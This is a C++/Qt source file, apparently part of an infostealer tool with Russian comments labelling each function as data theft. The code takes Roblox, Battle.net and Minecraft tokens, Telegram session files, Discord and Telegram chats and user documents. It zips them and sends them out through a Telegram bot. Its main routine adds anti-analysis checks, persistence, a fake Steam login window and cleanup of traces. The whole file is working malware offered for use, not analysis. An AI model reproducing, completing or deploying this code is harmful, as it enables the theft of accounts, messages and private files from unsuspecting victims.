        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error in StealEpicGamesData: " + std::string(e.what()));
        }
    }
    return result;
}

// Кража данных Roblox
std::string StealRobloxData() {
    if (!g_mainWindow->robloxCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\GlobalBasicSettings_13.xml";
    if (std::filesystem::exists(robloxPath)) {
        std::ifstream file(robloxPath);
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        std::regex cookieRegex("\\.ROBLOSECURITY=[^;]+");
        std::smatch match;
        if (std::regex_search(content, match, cookieRegex)) {
            result += "Roblox Cookie: " + match[0].str() + "\n";
        }
    }
    return result;
}

// Кража данных Battle.net
std::string StealBattleNetData() {
    if (!g_mainWindow->battlenetCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::string battleNetPath = std::string(appDataPath) + "\\Battle.net\\Battle.net.config";
    if (std::filesystem::exists(battleNetPath)) {
        std::ifstream file(battleNetPath);
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        std::regex tokenRegex("\"token\":\"[^\"]+\"");
        std::smatch match;
        if (std::regex_search(content, match, tokenRegex)) {
            result += "Battle.net Token: " + match[0].str() + "\n";
        }
    }
    return result;
}

// Кража данных Minecraft
std::string StealMinecraftData() {
    if (!g_mainWindow->minecraftCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::string mcPath = std::string(appDataPath) + "\\.minecraft\\launcher_profiles.json";
    if (std::filesystem::exists(mcPath)) {
        std::ifstream file(mcPath);
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        std::regex tokenRegex("\"accessToken\":\"[^\"]+\"");
        std::smatch match;
        if (std::regex_search(content, match, tokenRegex)) {
            result += "Minecraft Access Token: " + match[0].str() + "\n";
        }
        std::regex usernameRegex("\"name\":\"[^\"]+\"");
        if (std::regex_search(content, match, usernameRegex)) {
            result += "Minecraft Username: " + match[0].str() + "\n";
        }
    }
    return result;
}

// Кража данных Telegram
std::string StealTelegramData() {
    if (!g_mainWindow->telegramCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::string tgPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(tgPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(tgPath)) {
                if (entry.path().filename().string().find("map") != std::string::npos || entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
                    std::string fileName = entry.path().string();
                    std::ifstream file(fileName, std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "Telegram Session File Captured: " + fileName + "\n";
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error in StealTelegramData: " + std::string(e.what()));
        }
    }
    return result;
}

// Кража истории чатов
std::string StealChatHistory() {
    if (!g_mainWindow->chatHistoryCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::vector<std::pair<std::string, std::string>> chatApps = {
        {"Discord", std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\"},
        {"Telegram", std::string(appDataPath) + "\\Telegram Desktop\\tdata\\"}
    };
    for (const auto& app : chatApps) {
        if (std::filesystem::exists(app.second)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(app.second)) {
                    if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log" || entry.path().filename().string().find("map") != std::string::npos) {
                        std::ifstream file(entry.path(), std::ios::binary);
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        std::regex messageRegex("\"content\":\"[^\"]+\"");
                        std::smatch match;
                        std::string::const_iterator searchStart(content.cbegin());
                        while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
                            result += "[" + app.first + "] Message: " + match[0].str() + "\n";
                            searchStart = match.suffix().first;
                        }
                    }
                }
            } catch (const std::exception& e) {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Error in StealChatHistory for " + app.first + ": " + std::string(e.what()));
            }
        }
    }
    return result;
}

// Файловый граббер
std::vector<std::string> FileGrabber() {
    if (!g_mainWindow->fileGrabberCheckBox->isChecked()) return {};
    std::vector<std::string> grabbedFiles;
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png", ".zip", ".rar"};
    char desktopPath[MAX_PATH], docPath[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desktopPath);
    SHGetFolderPathA(nullptr, CSIDL_MYDOCUMENTS, nullptr, 0, docPath);
    std::vector<std::string> paths = {desktopPath, docPath};
    for (const auto& path : paths) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() && entry.file_size() < 10 * 1024 * 1024) { // Лимит 10 MB
                        grabbedFiles.push_back(entry.path().string());
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->appendLog("Grabbed file: " + entry.path().string());
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error in FileGrabber for " + path + ": " + std::string(e.what()));
        }
    }
    return grabbedFiles;
}

// Создание ZIP-архива
std::string CreateZipArchive(const std::string& data, const std::vector<std::string>& files) {
    std::string zipPath = "data_" + std::to_string(GetTickCount()) + ".zip";
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP archive");
        return "";
    }
    zip_source_t* source = zip_source_buffer(zip, data.c_str(), data.size(), 0);
    if (source && zip_file_add(zip, "data.txt", source, ZIP_FL_OVERWRITE) >= 0) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Added data.txt to ZIP");
    } else {
        zip_source_free(source);
    }
    for (const auto& file : files) {
        if (std::filesystem::exists(file)) {
            zip_source_t* fileSource = zip_source_file(zip, file.c_str(), 0, 0);
            if (fileSource && zip_file_add(zip, std::filesystem::path(file).filename().string().c_str(), fileSource, ZIP_FL_OVERWRITE) >= 0) {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Added " + file + " to ZIP");
            } else {
                zip_source_free(fileSource);
            }
        }
    }
    zip_close(zip);
    return zipPath;
}

// Отправка через Telegram
void SendViaTelegram(const std::string& data, const std::vector<std::string>& files) {
    if (g_mainWindow->sendMethodComboBox->currentText() != "Telegram") return;
    QNetworkAccessManager* manager = new QNetworkAccessManager;
    QUrl url("https://api.telegram.org/bot" + QString::fromStdString(TELEGRAM_BOT_TOKEN) + "/sendMessage");
    QNetworkRequest request(url);
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
    std::string message = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + QUrl::toPercentEncoding(data.c_str()).toStdString();
    QNetworkReply* reply = manager->post(request, message.c_str());
    QObject::connect(reply, &QNetworkReply::finished, [reply, manager]() {
        if (reply->error() == QNetworkReply::NoError) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Data sent via Telegram successfully");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to send data via Telegram: " + reply->errorString().toStdString());
        }
        reply->deleteLater();
        manager->deleteLater();
    });
    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
    for (const auto& file : files) {
        QFile* qFile = new QFile(QString::fromStdString(file));
        if (qFile->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"" + std::filesystem::path(file).filename().string().c_str() + "\""));
            filePart.setBodyDevice(qFile);
            qFile->setParent(multiPart);
            multiPart->append(filePart);
        }
    }
    QHttpPart textPart;
    textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
    textPart.setBody(TELEGRAM_CHAT_ID.c_str());
    multiPart->append(textPart);
    QNetworkAccessManager* fileManager = new QNetworkAccessManager;
    QUrl fileUrl("https://api.telegram.org/bot" + QString::fromStdString(TELEGRAM_BOT_TOKEN) + "/sendDocument");
    QNetworkRequest fileRequest(fileUrl);
    QNetworkReply* fileReply = fileManager->post(fileRequest, multiPart);
    multiPart->setParent(fileReply);
    QObject::connect(fileReply, &QNetworkReply::finished, [fileReply, fileManager]() {
        if (fileReply->error() == QNetworkReply::NoError) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Files sent via Telegram successfully");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to send files via Telegram: " + fileReply->errorString().toStdString());
        }
        fileReply->deleteLater();
        fileManager->deleteLater();
    });
}

// Основная функция сбора данных
void CollectData() {
    if (AntiAnalysis()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Anti-analysis triggered, exiting");
        return;
    }
    Stealth();
    Persist();
    FakeError();
    std::string collectedData;
    collectedData += GetCustomSystemInfo();
    std::string screenshot = TakeScreenshot();
    std::vector<std::string> files;
    if (!screenshot.empty()) files.push_back(screenshot);
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appDataPath);
    std::string localAppData = std::string(appDataPath);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath);
    std::string roamingAppData = std::string(appDataPath);
    collectedData += StealChromiumData("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\");
    collectedData += StealChromiumData("Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\");
    collectedData += StealChromiumData("Opera", roamingAppData + "\\Opera Software\\Opera Stable\\");
    collectedData += StealChromiumData("OperaGX", roamingAppData + "\\Opera Software\\Opera GX Stable\\");
    collectedData += StealChromiumData("Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\");
    collectedData += StealChromiumData("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\");
    collectedData += StealFirefoxData(roamingAppData + "\\Mozilla\\Firefox\\Profiles\\");
    if (g_mainWindow->chatHistoryCheckBox->isChecked()) {
        collectedData += GetBrowserHistory();
    }
    std::vector<std::string> discordTokens = StealDiscordTokens();
    for (const auto& token : discordTokens) collectedData += token + "\n";
    collectedData += InjectIntoDiscord();
    collectedData += CreateFakeSteamLoginWindow();
    collectedData += StealSteamSessionFromRegistry();
    collectedData += StealSteamWebSession();
    std::vector<std::string> steamMAFiles = StealSteamMAFiles();
    files.insert(files.end(), steamMAFiles.begin(), steamMAFiles.end());
    collectedData += StealEpicGamesData();
    collectedData += StealRobloxData();
    collectedData += StealBattleNetData();
    collectedData += StealMinecraftData();
    collectedData += StealTelegramData();
    collectedData += StealChatHistory();
    collectedData += CaptureWebSocketSessions("Discord.exe");
    collectedData += CaptureWebRTCSessions("Discord.exe");
    collectedData += StealUnsavedBrowserData("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Cache\\");
    collectedData += StealUnsavedBrowserData("Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Cache\\");
    collectedData += StealAppCacheData("Discord", roamingAppData + "\\discord\\Cache\\");
    std::vector<std::string> grabbedFiles = FileGrabber();
    files.insert(files.end(), grabbedFiles.begin(), grabbedFiles.end());
    std::string encryptedData = MultiLayerXOR(collectedData);
    std::string zipFile = CreateZipArchive(encryptedData, files);
    if (!zipFile.empty()) {
        SendViaTelegram(encryptedData, {zipFile});
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Data collection completed, ZIP created: " + zipFile);
        std::filesystem::remove(zipFile);
        for (const auto& file : files) std::filesystem::remove(file);
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP archive");
    }
}

MainWindow* g_mainWindow = nullptr;

int main(int argc, char* argv[]) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }
    QApplication app(argc, argv);
    g_mainWindow = new MainWindow();
    g_mainWindow->show();
    int result = app.exec();
    delete g_mainWindow;
    WSACleanup();
    return result;
}